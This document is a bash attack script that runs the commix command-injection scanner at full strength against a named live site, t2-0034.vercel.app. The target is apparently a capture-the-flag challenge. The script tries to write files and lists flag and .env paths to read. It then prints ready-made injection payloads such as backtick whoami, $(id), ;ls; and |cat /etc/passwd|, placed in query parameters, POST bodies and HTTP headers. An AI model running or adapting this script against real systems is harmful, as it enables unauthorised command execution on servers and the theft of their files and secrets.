#!/bin/bash
# Ultimate Commix Attack Script for https://t2-0034.vercel.app/
# Single comprehensive command that tests everything

echo "=========================================="
echo "ULTIMATE COMMIX EXPLOITATION"
echo "Target: https://t2-0034.vercel.app/"
echo "=========================================="
echo ""

# Create output directory
mkdir -p t2_0034_commix_results
cd t2_0034_commix_results

echo "[*] Starting comprehensive commix scan..."
echo "[*] This will test:"
echo "    - All injection techniques (Classic, Eval, Time-based, File-based)"
echo "    - Crawl entire site (3 levels deep)"
echo "    - Test GET/POST parameters"
echo "    - Test HTTP headers"
echo "    - Test cookies"
echo "    - Maximum testing level"
echo ""

# THE ULTIMATE COMMAND
commix \
  --url="https://t2-0034.vercel.app/" \
  --all \
  --crawl=3 \
  --level=3 \
  --technique=CBTF \
  --os=unix \
  --random-agent \
  --batch \
  --verbose \
  --tamper="space2plus" \
  --skip-empty \
  --output-dir=./scan_results \
  --file-write="/tmp/test.txt" \
  --file-dest="/tmp/test.txt" 2>&1 | tee commix_output.log

echo ""
echo "=========================================="
echo "SCAN COMPLETE"
echo "=========================================="
echo ""

# Check if any vulnerabilities were found
if grep -q "vulnerable" commix_output.log; then
    echo "[!!!] VULNERABILITIES FOUND!"
    echo ""
    echo "Extracting vulnerable endpoints..."
    grep -i "vulnerable" commix_output.log
    echo ""
    
    # Try to extract flag if vulnerability found
    echo "[*] Attempting to extract flag..."
    
    # Common flag locations
    FLAG_LOCATIONS=(
        "/flag.txt"
        "/flag"
        "/home/flag.txt"
        "/tmp/flag.txt"
        "/var/www/flag.txt"
        "/app/flag.txt"
        "/root/flag.txt"
        ".env"
        "flag"
    )
    
    for location in "${FLAG_LOCATIONS[@]}"; do
        echo "[*] Trying to read: $location"
        # This would need the actual vulnerable parameter found
        # commix --url="VULNERABLE_URL" --file-read="$location" --batch
    done
else
    echo "[*] No obvious command injection vulnerabilities found"
    echo "[*] This could mean:"
    echo "    1. The site is properly secured"
    echo "    2. Vulnerabilities exist but are not detectable by commix"
    echo "    3. Need to test specific endpoints manually"
fi

echo ""
echo "Results saved to: $(pwd)"
echo ""
echo "=========================================="
echo "MANUAL TESTING RECOMMENDATIONS"
echo "=========================================="
echo ""
echo "If automated scan didn't find anything, try manual testing:"
echo ""
echo "1. Test API endpoints:"
echo "   curl 'https://t2-0034.vercel.app/api/test?cmd=\`whoami\`'"
echo ""
echo "2. Test with different injection syntaxes:"
echo "   curl 'https://t2-0034.vercel.app/?param=\$(id)'"
echo "   curl 'https://t2-0034.vercel.app/?param=;ls;'"
echo "   curl 'https://t2-0034.vercel.app/?param=|cat /etc/passwd|'"
echo ""
echo "3. Test POST parameters:"
echo "   curl -X POST 'https://t2-0034.vercel.app/api/endpoint' -d 'cmd=\`whoami\`'"
echo ""
echo "4. Test headers:"
echo "   curl 'https://t2-0034.vercel.app/' -H 'User-Agent: \`whoami\`'"
echo "   curl 'https://t2-0034.vercel.app/' -H 'X-Forwarded-For: \`whoami\`'"
echo ""
echo "5. Use Burp Suite to intercept and modify requests"
echo ""

cd ..
